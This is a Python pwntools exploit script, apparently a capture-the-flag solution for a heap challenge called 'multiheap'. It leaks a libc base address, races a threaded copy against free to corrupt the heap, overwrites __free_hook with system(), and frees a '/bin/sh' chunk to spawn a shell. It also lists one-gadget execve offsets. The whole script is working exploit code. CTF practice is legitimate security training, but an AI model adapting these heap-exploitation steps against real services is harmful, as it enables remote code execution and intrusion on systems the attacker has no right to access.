from pwn import *
import sys
import IPython
signal.signal(signal.SIGUSR2, lambda sig, frame: IPython.embed())

context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

if len(sys.argv) == 2:
    r = remote('multiheap.chal.ctf.westerns.tokyo', '10001')
    is_remote = True
else:
    r = process('./multiheap.bak')
    #r = process('./multiheap')
    is_remote = False

def alloc(typ, size, thread=0):
    r.recvuntil('choice: ')
    r.sendline('1')
    r.sendline(typ)
    r.sendline(str(size))
    r.sendline('t' if thread else 'm')

def free(idx):
    r.recvuntil('choice: ')
    r.sendline('2')
    r.sendline(str(idx))

def view(idx):
    r.recvuntil('choice: ')
    r.sendline('3')
    r.recvuntil('Index: ')
    r.sendline(str(idx))
    s = r.recvuntil('======')
    return s[:-6]

def edit(idx, size, cont):
    assert len(cont) == size
    r.recvuntil('choice: ')
    r.sendline('4')
    r.sendline(str(idx))
    r.sendline(str(size))
    if type(cont) == str:
        r.send(cont)
    elif type(cont) == list:
        r.sendline(' '.join(map(str, cont)))

def copy(src, dst, size, thread=0):
    r.recvuntil('choice: ')
    r.sendline('5')
    r.sendline(str(src))
    r.sendline(str(dst))
    r.sendline(str(size))
    r.sendline('y' if thread else 'n')

# Leak libc addr
alloc('long', 0x48, 0)
edit(0, 1, [0x4141414141414141])
alloc('long', 0x500, 0)
free(1)

alloc('long', 0x500, 0)
copy(1, 0, 9, 0)

LIBC_OFF = 0x3ebca0
libc_base = int(view(0).split()[0].strip()) - LIBC_OFF
print hex(libc_base)

# Race
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
MALLOC_HOOK = 0x00000000003ebc30
FREE_HOOK = 0x00000000003ed8e8
SYSTEM = 0x000000000004f440
M1 = 0x4f2c5
M2 = 0x4f322
M3 = 0x10a38c

tries = 0
edit(0, 1, [libc_base + FREE_HOOK])

for _ in xrange(50):
    print '[*] Attempt: {}'.format(tries)
    alloc('long', 0x78, 0) # victim
    #copy(0, 2, 9, 1)
    #free(2)
    r.sendline('5')
    r.sendline('0')
    r.sendline('2')
    r.sendline('9')
    r.sendline('y')
    r.sendline('2')
    r.sendline('2')

    tries += 1

alloc('long', 0x78, 0)
alloc('long', 0x78, 0)
edit(3, 1, [libc_base + SYSTEM])
edit(2, 1, [u64("/bin/sh\x00")])

free(2)

r.interactive()
